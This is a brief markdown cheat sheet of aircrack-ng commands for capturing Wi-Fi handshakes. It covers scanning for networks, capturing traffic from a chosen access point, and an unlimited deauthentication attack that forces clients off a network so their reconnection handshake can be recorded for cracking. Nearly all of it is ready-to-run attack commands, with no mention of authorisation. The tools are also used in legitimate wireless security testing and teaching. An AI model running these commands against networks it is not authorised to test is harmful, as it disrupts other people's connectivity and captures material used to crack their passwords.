# Crack and Capture handshakes

## Installation

```
sudo apt install aircrack-ng
```

---

## Scan for nearby networks

```
sudo airodump-ng wlan0
```

## Scan a specific network

```
sudo airodump-ng wlan0 -d <AP BSSID>
```

### Explanation
`AP BSSID` - The AP's BSSID<br>
`wlan0` - Your wireless interface

## Capture packets being sent via a specific AP (Access Point)

```
sudo airodump-ng -w <file name> -c <channel> --bssid <AP BSSID> wlan0
```

### Explanation
`file name` - The name file to store the captured packets in<br>
`channel` - The channel the AP is listening on<br>
`AP BSSID` - The AP's BSSID<br>
`wlan0` - Your wireless interface

## Deauthenticate clients on a network

```
sudo aireplay-ng --deauth 0 -a <AP BSSID> wlan0
```

### Explanation
`deauth` - Run a deauth attack - specify amount of deauth packets to send, 0 = inf<br>
`AP BSSID` - The AP's BSSID<br>
`wlan0` - Your wireless interface

### Known errors
May state that the wireless interface is not on the same channel as the AP, a solution is to change the channel by entering the command:

```
sudo iwconfig wlan0 channel 1
```
Note: Change `wlan0` to your own interface